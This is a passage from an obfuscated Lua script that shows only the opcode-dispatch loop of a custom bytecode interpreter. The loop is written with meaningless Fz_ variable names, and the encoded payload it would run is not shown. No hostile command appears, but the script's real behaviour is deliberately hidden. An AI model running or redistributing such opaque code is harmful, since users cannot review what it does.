z_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];else local Fz_d=Fz_a[2];local Fz_e=Fz_c[Fz_d]local Fz_f=Fz_c[Fz_d+2];if(Fz_f>0)then if(Fz_e>Fz_c[Fz_d+1])then Fz_b=Fz_a[3];else Fz_c[Fz_d+3]=Fz_e;end elseif(Fz_e<Fz_c[Fz_d+1])then Fz_b=Fz_a[3];else Fz_c[Fz_d+3]=Fz_e;end end;elseif Fz_e>94 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_c[Fz_a[4]];end;elseif Fz_e<=99 then if Fz_e<=97 then if Fz_e==96 then Fz_c[Fz_a[2]]={};else Fz_b=Fz_a[3];end;elseif Fz_e==98 then if(Fz_c[Fz_a[2]]==Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else if(Fz_a[2]<Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=101 then if Fz_e==100 then if(Fz_c[Fz_a[2]]==Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else if(Fz_c[Fz_a[2]]<Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e>102 then Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];else local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if(Fz_c[Fz_a[2]]~=Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=110 then if Fz_e<=106 then if Fz_e<=104 then if(Fz_c[Fz_a[2]]~=Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;elseif Fz_e>105 then Fz_c[Fz_a[2]]=(Fz_a[3]~=0);else local Fz_h;local Fz_g;local Fz_e;Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]={};Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2];Fz_g=Fz_c[Fz_e]Fz_h=Fz_c[Fz_e+2];if(Fz_h>0)then if(Fz_g>Fz_c[Fz_e+1])then Fz_b=Fz_a[3];else Fz_c[Fz_e+3]=Fz_g;end elseif(Fz_g<Fz_c[Fz_e+1])then Fz_b=Fz_a[3];else Fz_c[Fz_e+3]=Fz_g;end end;elseif Fz_e<=108 then if Fz_e>107 then Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;else Fz_f[Fz_a[3]]=Fz_c[Fz_a[2]];end;elseif Fz_e==109 then Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];else local Fz_b=Fz_a[2]Fz_c[Fz_b](Fz_g(Fz_c,Fz_b+1,Fz_a[3]))end;elseif Fz_e<=114 then if Fz_e<=112 then if Fz_e==111 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;else if Fz_c[Fz_a[2]]then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e==113 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_a[4];else if not Fz_c[Fz_a[2]]then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=116 then if Fz_e==115 then local Fz_e;Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];end;elseif Fz_e>117 then if(Fz_c[Fz_a[2]]==Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else Fz_n=Fz_a[2];end;Fz_b=Fz_b+1;end;end);end;return Fz_i(true,{},Fz_p())();end)(string.byte,table.insert,setmetatable);

